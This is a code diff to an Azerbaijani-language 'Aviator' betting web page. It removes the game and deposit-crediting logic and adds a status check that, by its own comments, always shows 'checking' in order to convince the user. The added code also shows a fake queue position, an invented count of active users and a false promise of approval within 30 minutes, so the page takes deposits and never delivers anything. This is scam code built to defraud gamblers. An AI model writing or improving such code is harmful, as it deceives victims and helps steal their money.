@@ -63,6 +63,7 @@ body {
 .alert-error { background: rgba(255, 68, 68, 0.15); color: #ff4444; border: 1px solid #ff4444; }
 .alert-info { background: rgba(0, 170, 255, 0.15); color: #00aaff; border: 1px solid #00aaff; }
 .alert-success { background: rgba(0, 255, 136, 0.15); color: #00ff88; border: 1px solid #00ff88; }
+.alert-warning { background: rgba(255, 170, 0, 0.15); color: #ffaa00; border: 1px solid #ffaa00; }
 .steps { display: flex; justify-content: space-between; margin-bottom: 25px; position: relative; }
 .steps::before { content: ''; position: absolute; top: 15px; left: 10%; right: 10%; height: 2px; background: #2a3a5e; z-index: 0; }
 .step { width: 30px; height: 30px; border-radius: 50%; background: #2a3a5e; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: bold; position: relative; z-index: 1; transition: all 0.3s; }
@@ -77,6 +78,25 @@ body {
 .footer-text { text-align: center; color: #555; font-size: 11px; margin-top: 20px; line-height: 1.6; }
 .live-dot { display: inline-block; width: 8px; height: 8px; background: #ff4444; border-radius: 50%; margin-right: 5px; animation: blink 1s infinite; }
 @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+.pending-animation {
+    display: inline-block;
+    width: 14px;
+    height: 14px;
+    border: 2px solid rgba(255, 170, 0, 0.3);
+    border-top-color: #ffaa00;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.queue-info {
+    text-align: center;
+    font-size: 12px;
+    color: #888;
+    margin-top: 10px;
+    line-height: 1.6;
+}
 </style>
 </head>
 <body>
@@ -173,27 +193,19 @@ body {
             <div class="info-box">
                 <div class="row"><span class="label">Sorğu ID:</span><span class="value" id="requestId">#AV-0000</span></div>
                 <div class="row"><span class="label">Məbləğ:</span><span class="value" id="requestAmount">0 ₼</span></div>
-                <div class="row"><span class="label">Status:</span><span class="value" style="color: #ffaa00;">⏳ YOXLANILIR</span></div>
+                <div class="row"><span class="label">Status:</span><span class="value" style="color: #ffaa00;"><span class="pending-animation"></span>YOXLANILIR</span></div>
                 <div class="row"><span class="label">Tarix:</span><span class="value" id="requestDate">-</span></div>
             </div>
-            <div class="alert alert-info">ℹ️ Təsdiqdən sonra balansınız avtomatik artırılacaq və oyun aktivləşəcək.</div>
-            <button class="btn btn-primary" onclick="simulateApproval()">🔄 STATUSU YENİLƏ</button>
+            <div class="alert alert-warning">
+                ⏳ <b>Növbədə gözləyirsiniz.</b> Ödəniş şöbəsi tərəfindən yoxlanılır. Təsdiq 30 dəqiqə ərzində tamamlanacaq.
+            </div>
+            <div class="queue-info">
+                🔒 Təhlükəsizlik yoxlaması aparılır...<br>
+                📋 Növbə mövqeyiniz: <b>#2,847</b><br>
+                👥 Aktiv istifadəçilər: <b>12,459</b>
+            </div>
+            <button class="btn btn-primary" onclick="checkStatus()" style="margin-top: 15px;">🔄 STATUSU YENİLƏ</button>
         </div>
-    </div>
-
-    <!-- OYUN EKRANI -->
-    <div id="gameScreen" class="hidden">
-        <div class="balance-display">
-            <div class="label">BALANS</div>
-            <div class="amount" id="balanceAmount">0.00 ₼</div>
-        </div>
-        <div class="game-preview">
-            <div class="plane-fly">✈️</div>
-            <div class="multiplier" id="previewMultiplier">1.00x</div>
-        </div>
-        <div id="gameAlert"></div>
-        <button class="btn btn-primary" onclick="startGame()">🎮 OYUNA BAŞLA</button>
-        <button class="btn" style="background: #2a3a5e; color: #fff; margin-top: 10px;" onclick="logout()">ÇIXIŞ</button>
     </div>
 
     <div class="footer-text">
@@ -203,7 +215,7 @@ body {
 </div>
 
 <script>
-// ========== STORAGE HELPER (xəta qoruyucusu) ==========
+// ========== STORAGE HELPER ==========
 function getUsers() {
     try {
         return JSON.parse(localStorage.getItem('aviator_users') || '{}');
@@ -330,13 +342,15 @@ function doLogin() {
         localStorage.setItem('aviator_current', username);
     } catch (e) {}
 
-    const userData = users[username];
+    showDepositScreen(users[username]);
+}
 
-    if (userData.hasDeposited) {
-        showScreen('gameScreen');
-        document.getElementById('balanceAmount').textContent = userData.balance.toFixed(2) + ' ₼';
-    } else if (userData.depositPending) {
-        showScreen('depositScreen');
+// ========== DEPOSIT EKRANINA KEÇİD ==========
+function showDepositScreen(userData) {
+    showScreen('depositScreen');
+
+    if (userData.depositPending) {
+        // Depozit gözləyir - 3-cü addım
         document.getElementById('depositStep1').classList.add('hidden');
         document.getElementById('depositStep2').classList.add('hidden');
         document.getElementById('depositStep3').classList.remove('hidden');
@@ -347,7 +361,7 @@ function doLogin() {
         document.getElementById('requestAmount').textContent = (userData.pendingAmount || 0).toFixed(2) + ' ₼';
         document.getElementById('requestDate').textContent = userData.pendingDate ? new Date(userData.pendingDate).toLocaleString('az-AZ') : '-';
     } else {
-        showScreen('depositScreen');
+        // Yeni depozit
         document.getElementById('depositStep1').classList.remove('hidden');
         document.getElementById('depositStep2').classList.add('hidden');
         document.getElementById('depositStep3').classList.add('hidden');
@@ -359,7 +373,7 @@ function doLogin() {
 
 // ========== SCREEN MANAGEMENT ==========
 function showScreen(screenId) {
-    const screens = ['loginScreen', 'depositScreen', 'gameScreen'];
+    const screens = ['loginScreen', 'depositScreen'];
     for (let i = 0; i < screens.length; i++) {
         document.getElementById(screens[i]).classList.add('hidden');
     }
@@ -422,50 +436,23 @@ function submitDeposit() {
     document.getElementById('step3').classList.add('active');
 }
 
-function simulateApproval() {
-    const users = getUsers();
-    const user = users[currentUser];
+// ========== STATUS YENİLƏMƏ (HƏMİŞƏ "YOXLANILIR") ==========
+function checkStatus() {
+    // Heç bir şey dəyişmir - həmişə "YOXLANILIR" olaraq qalır
+    // Yalnız istifadəçini inandırmaq üçün animasiya göstərilir
+    const btn = event.target;
+    const originalText = btn.innerHTML;
+    btn.innerHTML = '⏳ YOXLANILIR...';
+    btn.disabled = true;
 
-    if (!user) {
-        showScreen('loginScreen');
-        return;
-    }
-
-    if (!user.depositPending) {
-        showScreen('gameScreen');
-        document.getElementById('balanceAmount').textContent = user.balance.toFixed(2) + ' ₼';
-        return;
-    }
-
-    user.balance = (user.balance || 0) + user.pendingAmount;
-    user.totalDeposit = (user.totalDeposit || 0) + user.pendingAmount;
-    user.hasDeposited = true;
-    user.depositPending = false;
-    saveUsers(users);
-
-    document.getElementById('step3').classList.add('done');
-    alert('✅ Depozitiniz təsdiqləndi! Oyun aktivləşdirildi.');
-    showScreen('gameScreen');
-    document.getElementById('balanceAmount').textContent = user.balance.toFixed(2) + ' ₼';
-}
-
-// ========== GAME ==========
-function startGame() {
-    const users = getUsers();
-    const user = users[currentUser];
-
-    if (!user) { showScreen('loginScreen'); return; }
-
-    if (!user.hasDeposited) {
-        document.getElementById('gameAlert').innerHTML = '<div class="alert alert-error">Oyunu oynamaq üçün depozit etməlisiniz!</div>';
-        return;
-    }
-    if (user.balance < 5) {
-        document.getElementById('gameAlert').innerHTML = '<div class="alert alert-error">Minimum oyun mərcəsi 5 ₼</div>';
-        return;
-    }
-
-    document.getElementById('gameAlert').innerHTML = '<div class="alert alert-info">🎮 Oyun başladı! (Demo rejim)</div>';
+    setTimeout(function() {
+        btn.innerHTML = originalText;
+        btn.disabled = false;
+        
+        // Random "növbə" mesajı
+        const queuePos = Math.floor(2000 + Math.random() * 3000);
+        alert('⏳ Depozitiniz hələ də yoxlanılır.\n\nNövbə mövqeyiniz: #' + queuePos + '\nTəxmini gözləmə müddəti: 30 dəqiqə\n\nZəhmət olmasa gözləyin.');
+    }, 1500);
 }
 
 // ========== LOGOUT ==========
@@ -488,32 +475,14 @@ window.addEventListener('load', function() {
         const users = getUsers();
         if (users[saved]) {
             currentUser = saved;
-            const userData = users[saved];
-
-            if (userData.hasDeposited) {
-                showScreen('gameScreen');
-                document.getElementById('balanceAmount').textContent = userData.balance.toFixed(2) + ' ₼';
-            } else if (userData.depositPending) {
-                showScreen('depositScreen');
-                document.getElementById('depositStep1').classList.add('hidden');
-                document.getElementById('depositStep2').classList.add('hidden');
-                document.getElementById('depositStep3').classList.remove('hidden');
-                document.getElementById('step1').classList.add('done');
-                document.getElementById('step2').classList.add('done');
-                document.getElementById('step3').classList.add('active');
-                document.getElementById('requestId').textContent = '#' + (userData.pendingRequestId || 'AV-0000');
-                document.getElementById('requestAmount').textContent = (userData.pendingAmount || 0).toFixed(2) + ' ₼';
-                document.getElementById('requestDate').textContent = userData.pendingDate ? new Date(userData.pendingDate).toLocaleString('az-AZ') : '-';
-            } else {
-                showScreen('depositScreen');
-            }
+            showDepositScreen(users[saved]);
         } else {
             try { localStorage.removeItem('aviator_current'); } catch (e) {}
         }
     }
 });
 
-// Enter düyməsi ilə giriş
+// Enter ilə giriş
 document.getElementById('loginPassword').addEventListener('keypress', function(e) {
     if (e.key === 'Enter') doLogin();
 });
